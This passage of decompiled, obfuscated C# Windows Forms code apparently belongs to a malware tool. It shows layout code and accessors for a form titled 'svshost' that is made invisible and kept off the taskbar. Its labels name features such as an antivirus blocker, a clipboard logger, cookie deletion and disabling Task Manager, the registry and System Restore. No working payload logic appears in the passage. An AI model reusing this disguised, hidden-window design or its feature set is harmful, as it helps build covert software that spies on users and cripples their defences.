		Label obj51 = vmethod_50();
		location = new Point(333, 342);
		((Control)obj51).set_Location(location);
		((Control)vmethod_50()).set_Name("Label22");
		Label obj52 = vmethod_50();
		size = new Size(22, 13);
		((Control)obj52).set_Size(size);
		((Control)vmethod_50()).set_TabIndex(148);
		vmethod_50().set_Text("run");
		vmethod_52().set_AutoSize(true);
		Label obj53 = vmethod_52();
		location = new Point(330, 359);
		((Control)obj53).set_Location(location);
		((Control)vmethod_52()).set_Name("Label23");
		Label obj54 = vmethod_52();
		size = new Size(42, 13);
		((Control)obj54).set_Size(size);
		((Control)vmethod_52()).set_TabIndex(149);
		vmethod_52().set_Text("taskbar");
		vmethod_54().set_AutoSize(true);
		Label obj55 = vmethod_54();
		location = new Point(325, 382);
		((Control)obj55).set_Location(location);
		((Control)vmethod_54()).set_Name("Label24");
		Label obj56 = vmethod_54();
		size = new Size(27, 13);
		((Control)obj56).set_Size(size);
		((Control)vmethod_54()).set_TabIndex(150);
		vmethod_54().set_Text("cmd");
		vmethod_56().set_AutoSize(true);
		Label obj57 = vmethod_56();
		location = new Point(330, 408);
		((Control)obj57).set_Location(location);
		((Control)vmethod_56()).set_Name("Label25");
		Label obj58 = vmethod_56();
		size = new Size(40, 13);
		((Control)obj58).set_Size(size);
		((Control)vmethod_56()).set_TabIndex(151);
		vmethod_56().set_Text("registry");
		vmethod_58().set_AutoSize(true);
		Label obj59 = vmethod_58();
		location = new Point(333, 435);
		((Control)obj59).set_Location(location);
		((Control)vmethod_58()).set_Name("Label26");
		Label obj60 = vmethod_58();
		size = new Size(49, 13);
		((Control)obj60).set_Size(size);
		((Control)vmethod_58()).set_TabIndex(152);
		vmethod_58().set_Text("rightclick");
		vmethod_60().set_AutoSize(true);
		Label obj61 = vmethod_60();
		location = new Point(324, 461);
		((Control)obj61).set_Location(location);
		((Control)vmethod_60()).set_Name("Label27");
		Label obj62 = vmethod_60();
		size = new Size(67, 13);
		((Control)obj62).set_Size(size);
		((Control)vmethod_60()).set_TabIndex(153);
		vmethod_60().set_Text("folderoptions");
		vmethod_62().set_AutoSize(true);
		Label obj63 = vmethod_62();
		location = new Point(318, 490);
		((Control)obj63).set_Location(location);
		((Control)vmethod_62()).set_Name("Label28");
		Label obj64 = vmethod_62();
		size = new Size(50, 13);
		((Control)obj64).set_Size(size);
		((Control)vmethod_62()).set_TabIndex(154);
		vmethod_62().set_Text("taskmngr");
		vmethod_64().set_AutoSize(true);
		Label obj65 = vmethod_64();
		location = new Point(420, 252);
		((Control)obj65).set_Location(location);
		((Control)vmethod_64()).set_Name("Label29");
		Label obj66 = vmethod_64();
		size = new Size(57, 13);
		((Control)obj66).set_Size(size);
		((Control)vmethod_64()).set_TabIndex(155);
		vmethod_64().set_Text("av-blocker");
		vmethod_66().set_AutoSize(true);
		Label obj67 = vmethod_66();
		location = new Point(420, 287);
		((Control)obj67).set_Location(location);
		((Control)vmethod_66()).set_Name("Label30");
		Label obj68 = vmethod_66();
		size = new Size(79, 13);
		((Control)obj68).set_Size(size);
		((Control)vmethod_66()).set_TabIndex(156);
		vmethod_66().set_Text("clipboardlogger");
		vmethod_68().set_AutoSize(true);
		Label obj69 = vmethod_68();
		location = new Point(423, 313);
		((Control)obj69).set_Location(location);
		((Control)vmethod_68()).set_Name("Label31");
		Label obj70 = vmethod_68();
		size = new Size(79, 13);
		((Control)obj70).set_Size(size);
		((Control)vmethod_68()).set_TabIndex(157);
		vmethod_68().set_Text("deletecoockies");
		vmethod_70().set_AutoSize(true);
		Label obj71 = vmethod_70();
		location = new Point(438, 333);
		((Control)obj71).set_Location(location);
		((Control)vmethod_70()).set_Name("Label32");
		Label obj72 = vmethod_70();
		size = new Size(39, 13);
		((Control)obj72).set_Size(size);
		((Control)vmethod_70()).set_TabIndex(158);
		vmethod_70().set_Text("cpanel");
		vmethod_72().set_AutoSize(true);
		Label obj73 = vmethod_72();
		location = new Point(432, 379);
		((Control)obj73).set_Location(location);
		((Control)vmethod_72()).set_Name("Label33");
		Label obj74 = vmethod_72();
		size = new Size(54, 13);
		((Control)obj74).set_Size(size);
		((Control)vmethod_72()).set_TabIndex(159);
		vmethod_72().set_Text("sysrestore");
		TextBox obj75 = vmethod_74();
		location = new Point(466, 15);
		((Control)obj75).set_Location(location);
		vmethod_74().set_Multiline(true);
		((Control)vmethod_74()).set_Name("TextBox5");
		vmethod_74().set_ScrollBars((ScrollBars)1);
		TextBox obj76 = vmethod_74();
		size = new Size(182, 73);
		((Control)obj76).set_Size(size);
		((Control)vmethod_74()).set_TabIndex(160);
		vmethod_76().set_Interval(2);
		vmethod_82().set_AutoSize(true);
		Label obj77 = vmethod_82();
		location = new Point(430, 408);
		((Control)obj77).set_Location(location);
		((Control)vmethod_82()).set_Name("Label34");
		Label obj78 = vmethod_82();
		size = new Size(47, 13);
		((Control)obj78).set_Size(size);
		((Control)vmethod_82()).set_TabIndex(161);
		vmethod_82().set_Text("sername");
		TextBox obj79 = vmethod_84();
		location = new Point(308, 112);
		((Control)obj79).set_Location(location);
		vmethod_84().set_Multiline(true);
		((Control)vmethod_84()).set_Name("TextBox6");
		vmethod_84().set_ScrollBars((ScrollBars)2);
		TextBox obj80 = vmethod_84();
		size = new Size(171, 79);
		((Control)obj80).set_Size(size);
		((Control)vmethod_84()).set_TabIndex(162);
		TextBox obj81 = vmethod_86();
		location = new Point(487, 94);
		((Control)obj81).set_Location(location);
		vmethod_86().set_Multiline(true);
		((Control)vmethod_86()).set_Name("TextBox7");
		vmethod_86().set_ScrollBars((ScrollBars)2);
		TextBox obj82 = vmethod_86();
		size = new Size(119, 86);
		((Control)obj82).set_Size(size);
		((Control)vmethod_86()).set_TabIndex(163);
		TextBox obj83 = vmethod_88();
		location = new Point(638, 94);
		((Control)obj83).set_Location(location);
		vmethod_88().set_Multiline(true);
		((Control)vmethod_88()).set_Name("TextBox8");
		vmethod_88().set_ScrollBars((ScrollBars)2);
		TextBox obj84 = vmethod_88();
		size = new Size(100, 86);
		((Control)obj84).set_Size(size);
		((Control)vmethod_88()).set_TabIndex(164);
		TextBox obj85 = vmethod_90();
		location = new Point(508, 217);
		((Control)obj85).set_Location(location);
		vmethod_90().set_Multiline(true);
		((Control)vmethod_90()).set_Name("TextBox9");
		vmethod_90().set_ScrollBars((ScrollBars)2);
		TextBox obj86 = vmethod_90();
		size = new Size(261, 129);
		((Control)obj86).set_Size(size);
		((Control)vmethod_90()).set_TabIndex(165);
		TextBox obj87 = vmethod_92();
		location = new Point(508, 368);
		((Control)obj87).set_Location(location);
		vmethod_92().set_Multiline(true);
		((Control)vmethod_92()).set_Name("TextBox10");
		TextBox obj88 = vmethod_92();
		size = new Size(284, 106);
		((Control)obj88).set_Size(size);
		((Control)vmethod_92()).set_TabIndex(166);
		vmethod_94().set_AutoSize(true);
		((Control)vmethod_94()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		Label obj89 = vmethod_94();
		location = new Point(247, 128);
		((Control)obj89).set_Location(location);
		((Control)vmethod_94()).set_Name("Label36");
		Label obj90 = vmethod_94();
		size = new Size(59, 13);
		((Control)obj90).set_Size(size);
		((Control)vmethod_94()).set_TabIndex(172);
		vmethod_94().set_Text("overallpath");
		vmethod_96().set_AutoSize(true);
		((Control)vmethod_96()).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_96()).set_ForeColor(Color.Red);
		Label obj91 = vmethod_96();
		location = new Point(685, 42);
		((Control)obj91).set_Location(location);
		((Control)vmethod_96()).set_Name("Label35");
		Label obj92 = vmethod_96();
		size = new Size(35, 37);
		((Control)obj92).set_Size(size);
		((Control)vmethod_96()).set_TabIndex(171);
		vmethod_96().set_Text("0");
		vmethod_98().set_AutoSize(true);
		((Control)vmethod_98()).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_98()).set_ForeColor(Color.Blue);
		Label obj93 = vmethod_98();
		location = new Point(400, 256);
		((Control)obj93).set_Location(location);
		((Control)vmethod_98()).set_Name("lblNumb");
		Label obj94 = vmethod_98();
		size = new Size(14, 13);
		((Control)obj94).set_Size(size);
		((Control)vmethod_98()).set_TabIndex(173);
		vmethod_98().set_Text("0");
		TextBox obj95 = vmethod_100();
		location = new Point(767, 15);
		((Control)obj95).set_Location(location);
		vmethod_100().set_Multiline(true);
		((Control)vmethod_100()).set_Name("TextBox11");
		TextBox obj96 = vmethod_100();
		size = new Size(100, 88);
		((Control)obj96).set_Size(size);
		((Control)vmethod_100()).set_TabIndex(174);
		TextBox obj97 = vmethod_102();
		location = new Point(321, 207);
		((Control)obj97).set_Location(location);
		vmethod_102().set_Multiline(true);
		((Control)vmethod_102()).set_Name("TextBox12");
		vmethod_102().set_ScrollBars((ScrollBars)2);
		TextBox obj98 = vmethod_102();
		size = new Size(244, 95);
		((Control)obj98).set_Size(size);
		((Control)vmethod_102()).set_TabIndex(175);
		vmethod_104().set_AutoSize(true);
		((Control)vmethod_104()).set_ForeColor(Color.Red);
		Label obj99 = vmethod_104();
		location = new Point(318, 205);
		((Control)obj99).set_Location(location);
		((Control)vmethod_104()).set_Name("Label37");
		Label obj100 = vmethod_104();
		size = new Size(45, 13);
		((Control)obj100).set_Size(size);
		((Control)vmethod_104()).set_TabIndex(176);
		vmethod_104().set_Text("Label37");
		((ListControl)vmethod_106()).set_FormattingEnabled(true);
		ListBox obj101 = vmethod_106();
		location = new Point(948, 8);
		((Control)obj101).set_Location(location);
		((Control)vmethod_106()).set_Name("ListBox1");
		ListBox obj102 = vmethod_106();
		size = new Size(81, 43);
		((Control)obj102).set_Size(size);
		((Control)vmethod_106()).set_TabIndex(177);
		TextBox obj103 = vmethod_110();
		location = new Point(891, 57);
		((Control)obj103).set_Location(location);
		vmethod_110().set_Multiline(true);
		((Control)vmethod_110()).set_Name("TextBox13");
		TextBox obj104 = vmethod_110();
		size = new Size(100, 44);
		((Control)obj104).set_Size(size);
		((Control)vmethod_110()).set_TabIndex(179);
		vmethod_112().set_AutoSize(true);
		Label obj105 = vmethod_112();
		location = new Point(635, 23);
		((Control)obj105).set_Location(location);
		((Control)vmethod_112()).set_Name("Label39");
		Label obj106 = vmethod_112();
		size = new Size(45, 13);
		((Control)obj106).set_Size(size);
		((Control)vmethod_112()).set_TabIndex(181);
		vmethod_112().set_Text("Label39");
		vmethod_114().set_AutoSize(true);
		Label obj107 = vmethod_114();
		location = new Point(716, 8);
		((Control)obj107).set_Location(location);
		((Control)vmethod_114()).set_Name("Label38");
		Label obj108 = vmethod_114();
		size = new Size(45, 13);
		((Control)obj108).set_Size(size);
		((Control)vmethod_114()).set_TabIndex(180);
		vmethod_114().set_Text("Label38");
		vmethod_116().set_AutoSize(true);
		Label obj109 = vmethod_116();
		location = new Point(635, 183);
		((Control)obj109).set_Location(location);
		((Control)vmethod_116()).set_Name("Label40");
		Label obj110 = vmethod_116();
		size = new Size(45, 13);
		((Control)obj110).set_Size(size);
		((Control)vmethod_116()).set_TabIndex(182);
		vmethod_116().set_Text("Label40");
		vmethod_118().set_AutoSize(true);
		Label obj111 = vmethod_118();
		location = new Point(70, 88);
		((Control)obj111).set_Location(location);
		((Control)vmethod_118()).set_Name("Label41");
		Label obj112 = vmethod_118();
		size = new Size(45, 13);
		((Control)obj112).set_Size(size);
		((Control)vmethod_118()).set_TabIndex(183);
		vmethod_118().set_Text("Label41");
		vmethod_122().set_Interval(1);
		TextBox obj113 = vmethod_124();
		location = new Point(483, 112);
		((Control)obj113).set_Location(location);
		vmethod_124().set_Multiline(true);
		((Control)vmethod_124()).set_Name("TextBox14");
		TextBox obj114 = vmethod_124();
		size = new Size(359, 188);
		((Control)obj114).set_Size(size);
		((Control)vmethod_124()).set_TabIndex(184);
		TextBox obj115 = vmethod_126();
		location = new Point(359, 148);
		((Control)obj115).set_Location(location);
		vmethod_126().set_Multiline(true);
		((Control)vmethod_126()).set_Name("TextBox15");
		TextBox obj116 = vmethod_126();
		size = new Size(257, 192);
		((Control)obj116).set_Size(size);
		((Control)vmethod_126()).set_TabIndex(185);
		TextBox obj117 = vmethod_128();
		location = new Point(286, 154);
		((Control)obj117).set_Location(location);
		vmethod_128().set_Multiline(true);
		((Control)vmethod_128()).set_Name("TextBox16");
		TextBox obj118 = vmethod_128();
		size = new Size(483, 267);
		((Control)obj118).set_Size(size);
		((Control)vmethod_128()).set_TabIndex(185);
		TextBox obj119 = vmethod_130();
		location = new Point(565, 112);
		((Control)obj119).set_Location(location);
		vmethod_130().set_Multiline(true);
		((Control)vmethod_130()).set_Name("TextBox17");
		TextBox obj120 = vmethod_130();
		size = new Size(162, 180);
		((Control)obj120).set_Size(size);
		((Control)vmethod_130()).set_TabIndex(186);
		vmethod_132().set_AutoSize(true);
		Label obj121 = vmethod_132();
		location = new Point(114, 272);
		((Control)obj121).set_Location(location);
		((Control)vmethod_132()).set_Name("Label42");
		Label obj122 = vmethod_132();
		size = new Size(45, 13);
		((Control)obj122).set_Size(size);
		((Control)vmethod_132()).set_TabIndex(187);
		vmethod_132().set_Text("Label42");
		TextBox obj123 = vmethod_134();
		location = new Point(144, 320);
		((Control)obj123).set_Location(location);
		((Control)vmethod_134()).set_Name("TextBox18");
		TextBox obj124 = vmethod_134();
		size = new Size(100, 20);
		((Control)obj124).set_Size(size);
		((Control)vmethod_134()).set_TabIndex(190);
		TextBox obj125 = vmethod_136();
		location = new Point(117, 360);
		((Control)obj125).set_Location(location);
		((Control)vmethod_136()).set_Name("TextBox19");
		TextBox obj126 = vmethod_136();
		size = new Size(100, 20);
		((Control)obj126).set_Size(size);
		((Control)vmethod_136()).set_TabIndex(191);
		TextBox obj127 = vmethod_138();
		location = new Point(117, 391);
		((Control)obj127).set_Location(location);
		((Control)vmethod_138()).set_Name("TextBox20");
		TextBox obj128 = vmethod_138();
		size = new Size(100, 20);
		((Control)obj128).set_Size(size);
		((Control)vmethod_138()).set_TabIndex(192);
		vmethod_138().set_Text("stop");
		vmethod_140().set_AutoSize(true);
		Label obj129 = vmethod_140();
		location = new Point(22, 252);
		((Control)obj129).set_Location(location);
		((Control)vmethod_140()).set_Name("Label43");
		Label obj130 = vmethod_140();
		size = new Size(45, 13);
		((Control)obj130).set_Size(size);
		((Control)vmethod_140()).set_TabIndex(193);
		vmethod_140().set_Text("Label43");
		vmethod_142().set_AutoSize(true);
		Label obj131 = vmethod_142();
		location = new Point(13, 286);
		((Control)obj131).set_Location(location);
		((Control)vmethod_142()).set_Name("Label44");
		Label obj132 = vmethod_142();
		size = new Size(45, 13);
		((Control)obj132).set_Size(size);
		((Control)vmethod_142()).set_TabIndex(194);
		vmethod_142().set_Text("Label44");
		vmethod_144().set_AutoSize(true);
		Label obj133 = vmethod_144();
		location = new Point(13, 313);
		((Control)obj133).set_Location(location);
		((Control)vmethod_144()).set_Name("Label45");
		Label obj134 = vmethod_144();
		size = new Size(45, 13);
		((Control)obj134).set_Size(size);
		((Control)vmethod_144()).set_TabIndex(195);
		vmethod_144().set_Text("Label45");
		vmethod_146().set_AutoSize(true);
		Label obj135 = vmethod_146();
		location = new Point(22, 358);
		((Control)obj135).set_Location(location);
		((Control)vmethod_146()).set_Name("Label46");
		Label obj136 = vmethod_146();
		size = new Size(45, 13);
		((Control)obj136).set_Size(size);
		((Control)vmethod_146()).set_TabIndex(196);
		vmethod_146().set_Text("Label46");
		vmethod_148().set_AutoSize(true);
		Label obj137 = vmethod_148();
		location = new Point(13, 397);
		((Control)obj137).set_Location(location);
		((Control)vmethod_148()).set_Name("Label47");
		Label obj138 = vmethod_148();
		size = new Size(45, 13);
		((Control)obj138).set_Size(size);
		((Control)vmethod_148()).set_TabIndex(197);
		vmethod_148().set_Text("Label47");
		vmethod_150().set_AutoSize(true);
		Label obj139 = vmethod_150();
		location = new Point(22, 416);
		((Control)obj139).set_Location(location);
		((Control)vmethod_150()).set_Name("Label48");
		Label obj140 = vmethod_150();
		size = new Size(45, 13);
		((Control)obj140).set_Size(size);
		((Control)vmethod_150()).set_TabIndex(198);
		vmethod_150().set_Text("Label48");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(865, 485);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_150());
		((Control)this).get_Controls().Add((Control)(object)vmethod_148());
		((Control)this).get_Controls().Add((Control)(object)vmethod_146());
		((Control)this).get_Controls().Add((Control)(object)vmethod_144());
		((Control)this).get_Controls().Add((Control)(object)vmethod_142());
		((Control)this).get_Controls().Add((Control)(object)vmethod_140());
		((Control)this).get_Controls().Add((Control)(object)vmethod_138());
		((Control)this).get_Controls().Add((Control)(object)vmethod_136());
		((Control)this).get_Controls().Add((Control)(object)vmethod_134());
		((Control)this).get_Controls().Add((Control)(object)vmethod_132());
		((Control)this).get_Controls().Add((Control)(object)vmethod_130());
		((Control)this).get_Controls().Add((Control)(object)vmethod_128());
		((Control)this).get_Controls().Add((Control)(object)vmethod_126());
		((Control)this).get_Controls().Add((Control)(object)vmethod_124());
		((Control)this).get_Controls().Add((Control)(object)vmethod_118());
		((Control)this).get_Controls().Add((Control)(object)vmethod_116());
		((Control)this).get_Controls().Add((Control)(object)vmethod_112());
		((Control)this).get_Controls().Add((Control)(object)vmethod_114());
		((Control)this).get_Controls().Add((Control)(object)vmethod_110());
		((Control)this).get_Controls().Add((Control)(object)vmethod_106());
		((Control)this).get_Controls().Add((Control)(object)vmethod_104());
		((Control)this).get_Controls().Add((Control)(object)vmethod_100());
		((Control)this).get_Controls().Add((Control)(object)vmethod_98());
		((Control)this).get_Controls().Add((Control)(object)vmethod_94());
		((Control)this).get_Controls().Add((Control)(object)vmethod_96());
		((Control)this).get_Controls().Add((Control)(object)vmethod_92());
		((Control)this).get_Controls().Add((Control)(object)vmethod_90());
		((Control)this).get_Controls().Add((Control)(object)vmethod_88());
		((Control)this).get_Controls().Add((Control)(object)vmethod_86());
		((Control)this).get_Controls().Add((Control)(object)vmethod_84());
		((Control)this).get_Controls().Add((Control)(object)vmethod_82());
		((Control)this).get_Controls().Add((Control)(object)vmethod_74());
		((Control)this).get_Controls().Add((Control)(object)vmethod_72());
		((Control)this).get_Controls().Add((Control)(object)vmethod_70());
		((Control)this).get_Controls().Add((Control)(object)vmethod_68());
		((Control)this).get_Controls().Add((Control)(object)vmethod_66());
		((Control)this).get_Controls().Add((Control)(object)vmethod_64());
		((Control)this).get_Controls().Add((Control)(object)vmethod_62());
		((Control)this).get_Controls().Add((Control)(object)vmethod_60());
		((Control)this).get_Controls().Add((Control)(object)vmethod_58());
		((Control)this).get_Controls().Add((Control)(object)vmethod_56());
		((Control)this).get_Controls().Add((Control)(object)vmethod_54());
		((Control)this).get_Controls().Add((Control)(object)vmethod_52());
		((Control)this).get_Controls().Add((Control)(object)vmethod_50());
		((Control)this).get_Controls().Add((Control)(object)vmethod_48());
		((Control)this).get_Controls().Add((Control)(object)vmethod_46());
		((Control)this).get_Controls().Add((Control)(object)vmethod_44());
		((Control)this).get_Controls().Add((Control)(object)vmethod_42());
		((Control)this).get_Controls().Add((Control)(object)vmethod_40());
		((Control)this).get_Controls().Add((Control)(object)vmethod_38());
		((Control)this).get_Controls().Add((Control)(object)vmethod_36());
		((Control)this).get_Controls().Add((Control)(object)vmethod_34());
		((Control)this).get_Controls().Add((Control)(object)vmethod_32());
		((Control)this).get_Controls().Add((Control)(object)vmethod_30());
		((Control)this).get_Controls().Add((Control)(object)vmethod_28());
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_102());
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("svshost");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(TextBox textBox_20)
	{
		textBox_0 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_2()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(TextBox textBox_20)
	{
		textBox_1 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_4()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(TextBox textBox_20)
	{
		textBox_2 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_6()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(TextBox textBox_20)
	{
		textBox_3 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_8()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(Label label_49)
	{
		label_0 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_49)
	{
		label_1 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_12()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Label label_49)
	{
		label_2 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_14()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(Label label_49)
	{
		label_3 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_16()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(Label label_49)
	{
		label_4 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_18()
	{
		return label_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(Label label_49)
	{
		label_5 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_20()
	{
		return label_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(Label label_49)
	{
		label_6 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_22()
	{
		return label_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(Label label_49)
	{
		label_7 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_24()
	{
		return label_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(Label label_49)
	{
		label_8 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_26()
	{
		return label_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_27(Label label_49)
	{
		label_9 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_28()
	{
		return label_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_29(Label label_49)
	{
		label_10 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_30()
	{
		return label_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_31(Label label_49)
	{
		label_11 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_32()
	{
		return label_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_33(Label label_49)
	{
		label_12 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_34()
	{
		return label_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_35(Label label_49)
	{
		EventHandler eventHandler = method_1;
		if (label_13 != null)
		{
			((Control)label_13).remove_Click(eventHandler);
		}
		label_13 = label_49;
		if (label_13 != null)
		{
			((Control)label_13).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_36()
	{
		return label_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_37(Label label_49)
	{
		label_14 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_38()
	{
		return label_15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_39(Label label_49)
	{
		label_15 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_40()
	{
		return label_16;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_41(Label label_49)
	{
		label_16 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_42()
	{
		return label_17;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_43(Label label_49)
	{
		label_17 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_44()
	{
		return label_18;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_45(Label label_49)
	{
		label_18 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_46()
	{
		return label_19;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_47(Label label_49)
	{
		label_19 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_48()
	{
		return label_20;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_49(Label label_49)
	{
		label_20 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_50()
	{
		return label_21;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_51(Label label_49)
	{
		label_21 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_52()
	{
		return label_22;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_53(Label label_49)
	{
		label_22 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_54()
	{
		return label_23;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_55(Label label_49)
	{
		label_23 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_56()
	{
		return label_24;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_57(Label label_49)
	{
		label_24 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_58()
	{
		return label_25;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_59(Label label_49)
	{
		label_25 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_60()
	{
		return label_26;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_61(Label label_49)
	{
		label_26 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_62()
	{
		return label_27;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_63(Label label_49)
	{
		label_27 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_64()
	{
		return label_28;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_65(Label label_49)
	{
		label_28 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_66()
	{
		return label_29;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_67(Label label_49)
	{
		label_29 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_68()
	{
		return label_30;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_69(Label label_49)
	{
		label_30 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_70()
	{
		return label_31;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_71(Label label_49)
	{
		label_31 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_72()
	{
		return label_32;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_73(Label label_49)
	{
		label_32 = label_49;
	}

	[SpecialName]
	internal virtual TextBox vmethod_74()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_75(TextBox textBox_20)
	{
		textBox_4 = textBox_20;
	}

	[SpecialName]
	internal virtual Timer vmethod_76()
	{
		return timer_0;
	}

